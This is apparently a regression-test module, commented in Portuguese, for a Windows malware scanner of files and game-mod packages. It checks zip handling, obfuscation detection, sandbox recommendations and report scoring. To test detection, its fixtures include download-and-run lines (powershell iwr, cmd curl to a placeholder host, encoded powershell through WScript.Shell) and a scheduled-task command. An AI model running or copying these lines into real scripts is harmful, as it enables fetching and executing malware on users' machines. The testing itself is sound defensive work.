"""Cenários da terceira rodada (reauditoria com Windows Sandbox real: F1–F5, C1–C5). Importado por run_regression.py."""
from __future__ import annotations

import time
import zipfile
from pathlib import Path

BS = chr(92)


def run_round3(ctx) -> None:
    TMP, mkpe, mkzip, analyze, scenario, check = ctx.TMP, ctx.mkpe, ctx.mkzip, ctx.analyze, ctx.scenario, ctx.check
    checks, notepad, FakeVT = ctx.checks, ctx.notepad, ctx.FakeVT
    from sentinela import sandbox
    from sentinela.scoring import Finding, build_verdict, final_findings, recommend, sanitize_report, score_sandbox

    # ---- C1: a VM órfã (vmmem) não pode travar o app
    check("C1 só vmmemWindowsSandbox/vmwp (VM órfã) NÃO conta como 'sandbox aberto'",
          not sandbox.parse_running({"vmmemwindowssandbox", "vmwp.exe", "explorer.exe"}))
    check("C1 WindowsSandboxClient.exe conta como aberto", sandbox.parse_running({"windowssandboxclient.exe"}))

    # ---- F1/F3: zips com acento e zip concatenado com NOMES IGUAIS
    if Path(ctx.SEVEN).exists():
        uni = mkzip("unicode.zip", {"ação.txt": "oi", "日本語/textura.dds": b"DDS ", "Ünï/Café.ini": "x"})
        scenario("F1 zip benigno com nomes acentuados/CJK NÃO é 'ambíguo'", {"safe", "unknown"}, uni, must_not_have="ambígua")
        mal, ben, cat = TMP / "m.zip", TMP / "b.zip", TMP / "mesmo_nome.zip"
        with zipfile.ZipFile(mal, "w") as z:
            z.writestr("run.bat", ctx.DESTRUCTIVE)
        with zipfile.ZipFile(ben, "w") as z:
            z.writestr("run.bat", "@echo off" + chr(13) + chr(10) + "echo ola" + chr(13) + chr(10))
        cat.write_bytes(mal.read_bytes() + ben.read_bytes())
        scenario("F3 zip concatenado com o MESMO nome e conteúdo diferente => detectado", {"caution", "danger"}, cat)

    # ---- F4: concatenação em Python/shell não é ofuscação; em script do Windows é
    py = TMP / "build.py"
    py.write_text("a = 'a' + 'b'" + chr(10) + "b = 'c' + 'd'" + chr(10) + "c = 'e' + 'f'" + chr(10) + "d = 'g' + 'h'" + chr(10) + "e = 'i' + 'j'" + chr(10), encoding="ascii")
    sr, fin, v = analyze(py)
    check("F4 .py comum com várias concatenações NÃO é Atenção", v.level != "caution" and not any(f.points > 0 for f in fin), f"{v.headline} {v.score}")
    ps = TMP / "ofusc.ps1"
    ps.write_text("$a='Down'+'load'+'St'+'ri'+'ng'+'x'+'y'; & ($a)", encoding="ascii")
    sr, fin, v = analyze(ps)
    check("F4 .ps1 com concatenação de literais curtos é detectado", any(f.stage == "static" and f.points > 0 for f in fin), f"{v.headline} {v.score}")

    # ---- F5: .lua/.rpy/.html/.svg que executam programas
    bad = (("mod.lua", "os.execute('powershell -nop -c iwr http://x/y.exe -OutFile a.exe')"),
           ("script.rpy", "import subprocess" + chr(10) + "subprocess.Popen('cmd.exe /c curl http://x/a.exe')"),
           ("pagina.html", "<script>new ActiveXObject('WScript.Shell').Run('powershell -enc AAAA')</script>"),
           ("img.svg", "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"))
    for nome, texto in bad:
        p = TMP / nome
        p.write_text(texto, encoding="utf-8")
        scenario(f"F5 {nome} que executa programa/baixa algo => não é Seguro", {"caution", "danger"}, p)
    scenario("F5 .lua legítimo (os.execute abrindo só um .txt do mod) NÃO é Atenção", {"safe", "unknown"},
             mkzip("mod_lua_ok.zip", {"mod.lua": "local n = 'a' .. 'b'" + chr(10) + "print(n)", "leia.txt": "oi"}))

    # ---- lista positiva: pacotes reais comuns
    skyrim = {"mod.esp": b"TES4", "Textures/a.dds": b"DDS ", "Scripts/x.pex": b"\xfa\x57\xc0\xfa", "Scripts/Source/x.psc": "Scriptname x",
              "Strings/mod_english.strings": b"\0", "Interface/m.swf": b"FWS", "Meshes/a.nif": b"NIF", "Meshes/a.tri": b"x", "Sound/a.fuz": b"x",
              "Sound/a.lip": b"x", "Meshes/a.egm": b"x", "Seq/mod.seq": b"x"}
    scenario("Lista positiva: pacote Skyrim completo (esp/pex/psc/swf/tri/fuz/...) => Seguro", {"safe"}, mkzip("skyrim.zip", skyrim))
    scenario("Lista positiva: Minecraft resource pack (.nbt/.mcmeta/.png) => Seguro", {"safe"},
             mkzip("mcpack.zip", {"pack.mcmeta": "{}", "assets/a.png": b"PNG", "data/x.nbt": b"x", "data/y.snbt": "{}"}))
    scenario("Lista positiva: .pyc/.exe desconhecido continuam sem 'Seguro' automático", {"unknown", "caution", "danger"},
             mkzip("com_pyc.zip", {"a.pyc": b"\x00\x01", "leia.txt": "oi", "x.zzz": b"?"}), must_have="não reconhecidos")

    # ---- F2: VT limpo e antigo, mas SEM assinatura => sandbox continua recomendado; sem sandbox => não é Seguro
    old = {"found": True, "stats": {"malicious": 0, "suspicious": 0, "harmless": 10, "undetected": 70}, "engines": {}, "link": "x",
           "first_seen": time.time() - 400 * 86400}

    class OldVT(FakeVT):
        def lookup(self, sha, status=None, cancelled=None):
            return old

    sr, fin, v = analyze(mkpe("sem_assinatura.exe"), OldVT())
    check("F2 exe SEM assinatura, VT limpo há 400 dias => sandbox 'recommended'", sr.recommendation.mode == "recommended", sr.recommendation.mode)
    check("F2 ...e sem o sandbox o veredito NÃO é Seguro (fica Inconclusivo)", v.level == "unknown", f"{v.headline} {v.score}")
    sr, fin, v = analyze(notepad, OldVT())
    check("F2 exe ASSINADO com VT antigo continua com sandbox 'optional'", sr.recommendation.mode == "optional", sr.recommendation.mode)

    # ---- C3: caminho do executável entre aspas
    rep = sanitize_report({"ok": True, "seconds": 30, "new_processes": [
        {"name": "schtasks.exe", "cmd": '"C:' + BS + 'Windows' + BS + 'System32' + BS + 'schtasks.exe" /create /tn x /tr calc.exe', "pid": 1, "ppid": 0}]})
    check("C3 schtasks com caminho entre aspas é reconhecido", any("tarefa agendada" in f.title.lower() for f in score_sandbox(rep, False)))

    # ---- C2: Defender do guest desligado vira nota informativa (não ameaça)
    rep = sanitize_report({"ok": True, "seconds": 30, "defender": {"active": False, "threats": [], "realtime_disabled": False}})
    fs = score_sandbox(rep, False)
    check("C2 Defender do sandbox desativado é só informativo (0 pontos), sem falso 'adulteração'",
          any("desativado" in f.title for f in fs) and all(f.points <= 0 for f in fs if "Defender" in f.title))

    # ---- C5: limite de captura maior
    check("C5 captura de tela de até 16 MB é aceita", sandbox.MAX_SHOT >= 16 << 20)
